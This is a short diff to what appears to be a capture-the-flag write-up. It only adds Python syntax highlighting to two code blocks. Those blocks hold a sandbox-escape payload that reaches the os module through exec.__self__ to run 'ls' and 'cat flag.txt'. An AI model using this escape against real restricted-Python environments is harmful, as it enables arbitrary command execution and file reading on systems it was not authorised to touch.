@@ -67,7 +67,7 @@ while True:
 
 > COMMAND
 
-```
+```python
 exec.__self__.__import__("os").popen("ls").read()
 ```
 
@@ -80,7 +80,7 @@ exec.__self__.__import__("os").popen("ls").read()
 
 > COMMAND
 
-```
+```python
 exec.__self__.__import__("os").popen("cat flag.txt").read()
 ```
 
